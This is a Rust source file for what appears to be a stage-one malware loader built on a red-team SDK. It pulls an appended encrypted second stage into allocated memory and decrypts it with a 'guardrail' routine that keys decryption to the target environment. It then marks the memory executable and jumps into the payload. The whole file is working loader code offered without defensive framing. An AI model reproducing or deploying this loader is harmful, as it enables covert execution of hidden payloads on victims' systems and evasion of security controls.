#![no_std]
#![no_main]

#[panic_handler]
fn panic(_info: &core::panic::PanicInfo) -> ! {
    loop {}
}

use core::{ffi::{c_void}, ptr::null_mut};
use crystal_sdk::{append_data, get_resource, import, mem::memcpy};
use winapi::{shared::{basetsd::SIZE_T, minwindef::{DWORD, LPVOID, PDWORD}}, um::winnt::{MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, MEM_TOP_DOWN, PAGE_EXECUTE_READ, PAGE_READWRITE,},};

append_data!(stage2, findAppendedS2, "__STAGE2__");

import!(KERNEL32!VirtualAlloc(lpAddress: LPVOID, dwSize: SIZE_T, flAllocationType: DWORD, flProtect: DWORD) -> LPVOID);
import!(KERNEL32!VirtualFree(lpAddress: LPVOID, dwSize: SIZE_T, flAllocationType: DWORD) -> i32);
import!(KERNEL32!VirtualProtect(lpAddress: LPVOID, dwSize: SIZE_T, flNewProtect: DWORD, lpflOldProtect: PDWORD) -> i32);

unsafe extern "C" {
    fn guardrail_decrypt(dst: *mut u8, len: i32, outlen: *mut i32) -> *const u8;
}

type FreeAndRun = unsafe extern "C" fn(loader_start: *const c_void);

#[unsafe(no_mangle)]
extern "C" fn go() {
    unsafe {
        let stage_2 = get_resource(findAppendedS2());
        let buffer;
        let mut old_prot = 0u32;
        let data;

        /* Allocate the memory for our decrypted stage 2. We are responsible for free()'ing this.
         * We will free this value in run_stage2() */
        buffer = VirtualAlloc(
            null_mut(),
            stage_2.len(),
            MEM_RESERVE | MEM_COMMIT | MEM_TOP_DOWN,
            PAGE_READWRITE,
        );

        /* copy our (encrypted) stage 2 over to our RW working buffer, our guardrail PICO decrypts in place */
        memcpy(buffer as _, stage_2.as_ptr(), stage_2.len());

        /* run our guardrail COFF to handle *everything* about the guardrail process. Note that the return
         * value of this function is a SLICE into the buffer we passed in. It's not a new allocation. */
        data = guardrail_decrypt(buffer as _, stage_2.len() as _, null_mut());

        /*
         * Guadrail decryption FAILED, do something else, or just exit.
         */
        if data.is_null() {
            VirtualFree(buffer as _, 0, MEM_RELEASE);
            return;
        }

        if VirtualProtect(buffer as _, stage_2.len(), PAGE_EXECUTE_READ, &mut old_prot) == 0 {
            return;
        }

        core::mem::transmute::<_, FreeAndRun>(data)(go as _);
    };
}
